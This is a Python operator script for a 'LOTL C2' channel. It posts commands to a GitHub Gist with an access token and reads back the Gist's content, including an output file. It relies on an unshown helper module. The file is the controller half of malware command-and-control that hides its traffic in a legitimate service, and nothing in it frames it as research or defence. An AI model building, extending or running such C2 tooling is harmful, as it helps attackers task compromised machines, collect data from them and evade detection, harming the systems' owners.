import argparse
import logging
import json
from modules.lotl_c2 import update_gist, get_gist_content

def main():
    parser = argparse.ArgumentParser(description="Operator script for the LOTL C2 channel.")
    parser.add_argument("action", choices=['post', 'get'], help="The action to perform.")
    parser.add_argument("--gist-id", required=True, help="The ID of the Gist to use for C2.")
    parser.add_argument("--command", help="The command to post to the C2 channel.")
    parser.add_argument("--token", required=True, help="Your GitHub personal access token.")

    args = parser.parse_args()

    command_filename = "command.txt"
    output_filename = "output.txt"

    if args.action == 'post':
        if not args.command:
            print("Error: --command is required for the 'post' action.")
            return

        if update_gist(args.gist_id, command_filename, args.command, args.token):
            print(f"Command '{args.command}' posted to Gist {args.gist_id}.")

    elif args.action == 'get':
        content = get_gist_content(args.gist_id)
        if content:
            # This is a simplification; we should check which file we got
            print(f"\n--- Current Gist Content ---\n")
            print(content)
            print("\n---------------------------\n")

if __name__ == "__main__":
    main()